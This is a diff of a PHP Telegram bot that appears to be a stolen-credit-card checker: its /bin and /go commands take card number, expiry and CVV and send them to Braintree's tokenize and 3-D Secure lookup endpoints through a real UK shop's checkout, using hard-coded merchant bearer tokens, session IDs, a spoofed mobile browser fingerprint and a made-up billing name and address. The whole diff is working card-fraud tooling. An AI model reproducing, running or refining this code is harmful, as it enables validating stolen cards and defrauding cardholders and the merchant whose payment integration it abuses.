@@ -1507,7 +1507,8 @@ editMessage($chat_id,$respuesta,$id_text);
 
 elseif((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)||(strpos($message, ".bin") === 0)){
 $si = substr($message, 5);
-
+$bin = substr($si, 0, 6);
+	
 if (is_numeric($si) && ($si != '')){
 }else{
 $respuesta = "🚫 Oops!\nUse this format: /bin xxxxxx\n";
@@ -1524,8 +1525,8 @@ $id_text = file_get_contents("ID");
 //----------------------------------------------------//
 
 
-$bin = substr($message, 5);
-$bin = substr("$bin", 0, 6);
+//$bin = substr($message, 5);
+//$bin = substr("$bin", 0, 6);
 $startTime = microtime(true); //TIEMPO DE INICIO
 
 
@@ -2108,14 +2109,16 @@ $num = "$cc$mes$ano1$cvv";
 //-----------------------------------------------------//
 $verify = substr($cc, 16, 1);
 if($verify != ""){
-$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+$respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
+
 sendMessage($chat_id,$respuesta, $message_id);
 die();
 }
 
 if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
 }else{
-$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /go cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !go cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .go cc|m|y|cvv\n";
+	$respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
+
 sendMessage($chat_id,$respuesta, $message_id);
 die();
 }
@@ -2289,6 +2292,10 @@ $id_text = file_get_contents("ID");
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
+$sessionId = "dd72372b-f7d3-4f8d-9c50-00c4237716fb";
+$bear = "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU4Njc3MDEsImp0aSI6ImY4MzBlMTY1LTM2YWItNDRkNS04MjA2LWFlOWM0YmZkNzY3MiIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.7t5L4uCB2WO_zsPvpXllrj1thPY6-Sw574GfT6T3DhYC2h4zTt-csilmPTEkWkRtgGfcKCgO5gPebB_PUzsnIg";
+$dfReferenceId = "0_d5a89a7e-95cc-4a75-95ba-49681cd33393";
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
@@ -2298,13 +2305,13 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"02243e51-0f3c-424f-8e79-947315b152e6"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
+  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$sessionId.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
     'Content-Type: application/json',
     'sec-ch-ua-platform: "Android"',
-    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU2ODA2MDcsImp0aSI6IjFmMDhlMTdjLTdjZmEtNDA3Zi04ZmY4LWNhYWNjMGI5ZGZkZiIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.-bFd27lJD34Cwg3-nR7BwCJbWiARG7fZYAWbvRv5KrcAi1pwO8X9M6mbeco8KrlgTDkf96hBsQlKw0or9dMzbQ',
+    'authorization: Bearer '.$bear.'',
     'braintree-version: 2018-05-10',
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
@@ -2330,7 +2337,6 @@ $token = $json["data"]["tokenizeCreditCard"]["token"];
 echo "$token\n";
 
 
-
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.braintreegateway.com/merchants/vp9b39r7c3b9tmpj/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup',
@@ -2340,7 +2346,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => '{"amount":"35.00","additionalInfo":{"billingLine1":"1008 Alum Rock Road","billingCity":"Birmingham","billingPostalCode":"B8 2LS","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Carlos","billingSurname":"Perez"},"challengeRequested":[true,true],"bin":"559994","dfReferenceId":"1_94fedfd0-ffa2-4225-b108-b18873b19f0e","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":1129,"issuerDeviceDataCollectionTimeElapsed":5847,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzU2ODA2MDcsImp0aSI6IjFmMDhlMTdjLTdjZmEtNDA3Zi04ZmY4LWNhYWNjMGI5ZGZkZiIsInN1YiI6InZwOWIzOXI3YzNiOXRtcGoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZwOWIzOXI3YzNiOXRtcGoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImdyYWhhbWFuZGdyZWVuR0JQIn19.-bFd27lJD34Cwg3-nR7BwCJbWiARG7fZYAWbvRv5KrcAi1pwO8X9M6mbeco8KrlgTDkf96hBsQlKw0or9dMzbQ","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.grahamandgreen.co.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"02243e51-0f3c-424f-8e79-947315b152e6"}}',
+  CURLOPT_POSTFIELDS => '{"amount":"35.00","additionalInfo":{"billingLine1":"1008 Lemonade Building","billingLine2":"3 Arboretum Place","billingCity":"Barking","billingPostalCode":"IG11 7PY","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Carlos","billingSurname":"Perez"},"challengeRequested":[true,true],"bin":"'.$bin.'","dfReferenceId":"'.$dfReferenceId.'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.97.2","cardinalDeviceDataCollectionTimeElapsed":1310,"issuerDeviceDataCollectionTimeElapsed":3529,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bear.'","braintreeLibraryVersion":"braintree/web/3.97.2","_meta":{"merchantAppId":"www.grahamandgreen.co.uk","platform":"web","sdkVersion":"3.97.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$sessionId.'"}}',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'Accept-Encoding: gzip, deflate, br, zstd',
@@ -2349,7 +2355,7 @@ curl_setopt_array($curl, [
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.7',
+    'accept-language: es-US,es;q=0.8',
     'origin: https://www.grahamandgreen.co.uk',
     'sec-fetch-site: cross-site',
     'sec-fetch-mode: cors',
@@ -2358,10 +2364,9 @@ curl_setopt_array($curl, [
     'priority: u=1, i',
   ],
 ]);
-
+	
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
 curl_close($curl);
 $json_obj = json_decode($response, true);
 
